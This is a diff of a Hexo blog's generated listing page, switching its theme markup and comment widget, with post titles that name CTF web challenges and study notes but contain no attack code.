+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"comment-three-tau.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":true,"pageview":false,"placeholder":"说两句吧~","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"visitor":true,"comment_count":true,"requiredFields":["nick"],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/page/2/"}</script>
+<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css">
+<script>
+document.addEventListener('page:loaded', () => {
+  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
+    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
+  ).then(() => 
+    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
+  );
 });
-document.addEventListener("pjax:complete", reset);document.addEventListener('pjax:success', _ => bszCaller.fetch(
- "//busuanzi.ibruce.info/busuanzi?jsonpCallback=BusuanziCallback", a => {
-  bszTag.texts(a),
-  bszTag.shows()
-}));reset()})</script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
- waline({
-   el: '#waline',
-   dark: ':root[theme-mode="dark"]',
-   serverURL: '',
-   path: window.location.pathname,
- });document.querySelector('.lg-container')?.remove()
-lightGallery(document.getElementById('post-bg'), {
-  plugins: [lgZoom,lgThumbnail],
-  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
- cacheBust: false,
- selectors: ['title','article','#aside-block','.pjax-js'],
- switches: {'article': Pjax.switches.sideBySide},
- switchesOptions: {
-   'article': {
-     classNames: {
-       remove: "pjax-out",
-       add: "pjax-in"
-     }
-   }
- }
-});
-document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a class="navBlock" href="/Problems/"><span class="navItemTitle">Problems</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div class="posts"><a class="recent-post" href="/2025/02/21/CS%E8%87%AA%E5%AD%A6%E6%8C%87%E5%8D%97%E7%AC%94%E8%AE%B0/"><object><div class="recent-info"><span class="categories"><span>无分类</span></span><span class="tags"><object><a href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a></object></span><time datetime="2025-02-21T02:50:45.000Z">2025-02-21</time></div><h1 class="recent-title">CS自学指南笔记</h1><div class="recent-excerpt"></div><span class="read-more">阅读文章 +</span></object></a><a class="recent-post" href="/2025/02/20/%E3%80%8A%E8%AE%A1%E7%BD%91%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E3%80%8B%E4%BD%A0%E8%AE%B0%E5%BE%97%E4%BB%80%E4%B9%88%E9%83%BD%E9%BB%98%E4%B8%8B%E6%9D%A5/"><object><div class="recent-info"><span class="categories"><span>无分类</span></span><span class="tags"><object><a href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a></object></span><time datetime="2025-02-20T14:01:22.000Z">2025-02-20</time></div><h1 class="recent-title">《计网自顶向下》你记得什么都默下来</h1><div class="recent-excerpt"></div><span class="read-more">阅读文章 +</span></object></a><a class="recent-post" href="/2025/02/20/HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-HowToGetShell/"><object><div class="recent-info"><span class="categories"><object><a href="/categories/Web/">Web</a></object></span><span class="tags"><object><a href="/tags/PHP/">PHP</a></object><object><a href="/tags/%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87/">取反绕过</a></object><object><a href="/tags/%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87/">异或绕过</a></object><object><a href="/tags/%E6%97%A0%E5%AD%97%E6%AF%8DRCE/">无字母RCE</a></object><object><a href="/tags/RCE/">RCE</a></object></span><time datetime="2025-02-20T13:41:05.000Z">2025-02-20</time></div><h1 class="recent-title">[HUBUCTF 2022 新生赛]HowToGetShell</h1><div class="recent-excerpt"></div><span class="read-more">阅读文章 +</span></object></a><a class="recent-post" href="/2025/02/19/%E6%88%91%E6%9C%89%E5%B7%A8%E7%89%A9%E6%81%90%E6%83%A7%E7%97%87/"><object><div class="recent-info"><span class="categories"><span>无分类</span></span><span class="tags"><span>无标签</span></span><time datetime="2025-02-19T09:35:34.000Z">2025-02-19</time></div><h1 class="recent-title">我有巨物恐惧症</h1><div class="recent-excerpt"></div><span class="read-more">阅读文章 +</span></object></a><a class="recent-post" href="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/"><object><div class="recent-info"><span class="categories"><object><a href="/categories/Web/">Web</a></object></span><span class="tags"><object><a href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></object><object><a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">报错注入</a></object><object><a href="/tags/%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/">空格绕过</a></object></span><time datetime="2025-02-19T09:00:13.000Z">2025-02-19</time></div><h1 class="recent-title">[NCTF 2018]滴!晨跑打卡</h1><div class="recent-excerpt"></div><span class="read-more">阅读文章 +</span></object></a><a class="recent-post" href="/2025/02/19/%E6%B0%B8%E8%BF%9C%E8%BF%BD%E4%B8%8D%E4%B8%8A%E7%9A%84%E6%97%B6%E9%97%B4/"><object><div class="recent-info"><span class="categories"><object><a href="/categories/Index/">Index</a></object></span><span class="tags"><span>无标签</span></span><time datetime="2025-02-19T08:57:03.000Z">2025-02-19</time></div><h1 class="recent-title">永远追不上的时间</h1><div class="recent-excerpt"></div><span class="read-more">阅读文章 +</span></object></a><a class="recent-post" href="/2025/02/17/NPC%C2%B2CTF-%E9%83%A8%E5%88%86WP/"><object><div class="recent-info"><span class="categories"><span>无分类</span></span><span class="tags"><span>无标签</span></span><time datetime="2025-02-17T14:59:57.000Z">2025-02-17</time></div><h1 class="recent-title">NPC²CTF_部分WP</h1><div class="recent-excerpt"></div><span class="read-more">阅读文章 +</span></object></a><a class="recent-post" href="/2025/02/16/VNCTF-%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB%E7%AD%94%E6%A1%88/"><object><div class="recent-info"><span class="categories"><span>无分类</span></span><span class="tags"><span>无标签</span></span><time datetime="2025-02-16T12:25:08.000Z">2025-02-16</time></div><h1 class="recent-title">VNCTF 面试问题汇总答案</h1><div class="recent-excerpt"><hr>Here's something encrypted, password is required to continue reading.</div><span class="read-more">阅读文章 +</span></object></a><a class="recent-post" href="/2025/02/15/HNCTF-2022-WEEK4-pop%E5%AD%90%E5%92%8Cpipi%E7%BE%8E/"><object><div class="recent-info"><span class="categories"><object><a href="/categories/Web/">Web</a></object></span><span class="tags"><object><a href="/tags/PHP/">PHP</a></object><object><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></object><object><a href="/tags/POP%E9%93%BE/">POP链</a></object></span><time datetime="2025-02-15T12:06:10.000Z">2025-02-15</time></div><h1 class="recent-title">[HNCTF 2022 WEEK4]pop子和pipi美</h1><div class="recent-excerpt"></div><span class="read-more">阅读文章 +</span></object></a><a class="recent-post" href="/2025/02/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce/"><object><div class="recent-info"><span class="categories"><object><a href="/categories/Web/">Web</a></object></span><span class="tags"><object><a href="/tags/%E6%97%A0%E5%AD%97%E6%AF%8DRCE/">无字母RCE</a></object><object><a href="/tags/RCE/">RCE</a></object><object><a href="/tags/WAF%E7%BB%95%E8%BF%87/">WAF绕过</a></object></span><time datetime="2025-02-14T07:25:41.000Z">2025-02-14</time></div><h1 class="recent-title">[SWPUCTF 2021 新生赛]hardrce</h1><div class="recent-excerpt"></div><span class="read-more">阅读文章 +</span></object></a></div><div id="paginator"><a class="extend prev" rel="prev" href="/">Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next</a></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo" style="margin:0;border-radius:0;"></a><h1 id="Dr"><a href="/">温柔刀</a></h1><div id="description"><p>JNU_WEB</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/Gent1eknife"><i class="fab fa-github" alt="GitHub"></i></a></div></div><div id="aside-block"><section id="total"><a id="total-archives" href="/archives"><span class="total-title">文章 总数:</span><span class="total-number">30</span></a><div id="total-tags"><span class="total-title">标签:</span><span class="total-number">28</span></div><div id="total-categories"><span class="total-title">分类:</span><span class="total-number">5</span></div><br><div id="total-view"><span class="total-title" id="busuanzi_container_site_pv">总访问量：<span class="total-number" id="busuanzi_value_site_pv">加载中...</span></span><br><span class="total-title" id="busuanzi_container_site_uv">访客数：<span class="total-number" id="busuanzi_value_site_uv">加载中...</span></span></div></section></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
+</script>
+
+</body>
+</html>
